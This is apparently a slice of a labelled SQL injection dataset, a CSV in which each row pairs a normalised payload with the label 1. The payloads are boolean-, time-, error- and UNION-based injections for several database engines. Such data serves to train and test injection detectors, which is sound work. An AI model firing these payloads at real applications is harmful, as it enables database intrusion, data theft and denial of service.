row_index,payload_norm,label,sqli_type_hint
3330,1'|| ( select 'uedk' where 4655 = 4655,1,
3331,"1%"" or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,
3332,"1' or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",1,
3333,select ( case when ( 1291 = 6612 ) then 1 else 1291* ( select 1291 from master..sysdatabases ) end ) --,1,
3334,-2429%' or 6890 = 5846,1,
3335,"1%"" ) ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ( ( ""%"" = """,1,
3336,-4761 order by 1--,1,
3337,1' or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #,1,
3338,"-4394' ) ) union all select 3409,3409--",1,
3339,-2960' or 2163 = 3143--,1,
3340,1' ) where 1645 = 1645 rlike sleep ( 5 ) --,1,
3341,"-6890"" ) ) ) union all select 1115#",1,
3342,1 ) where 4479 = 4479 rlike ( select ( case when ( 6351 = 4367 ) then 1 else 0x28 end ) ) --,1,
3343,"select * from generate_series ( 2317,2317,case when ( 2317 = 9706 ) then 1 else 0 end ) limit 1--",1,
3344,"select * from generate_series ( 3427,3427,case when ( 3427 = 7516 ) then 1 else 0 end ) limit 1--",1,
3345,"1"" and elt ( 4249 = 4249,7259 )",1,
3346,"1' ) ) as ewyk where 4828 = 4828 and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --",1,
3347,"select count ( * ) from generate_series ( 1,5000000 ) and ""%"" = """,1,
3348,"-8186%' or elt ( 1032 = 1032,3623 ) and '%' = '",1,
3349,1 ) ) rlike sleep ( 5 ) and ( ( 8773 = 8773,1,
3350,select case when 7649 = 9297 then 1 else null end--,1,
3351,"-2872 ) where 8797 = 8797 or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",1,
3352,"-7255' union all select 2127,2127,2127,2127,2127#",1,
3353,"1' ) where 1363 = 1363 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) --",1,
3354,"1%"" ) ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( ( ""%"" = """,1,
3355,"1'|| ( select 'jpow' from dual where 4381 = 4381 and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) ) ||'",1,
3356,1 ) as tbve where 4828 = 4828,1,
3357,1'+ ( select iwbs where 4939 = 4939,1,
3358,"1' in boolean mode ) union all select null,null,null,null,null--",1,
3359,"-4385%' ) ) union all select 6694,6694,6694,6694,6694,6694,6694,6694,6694,6694#",1,
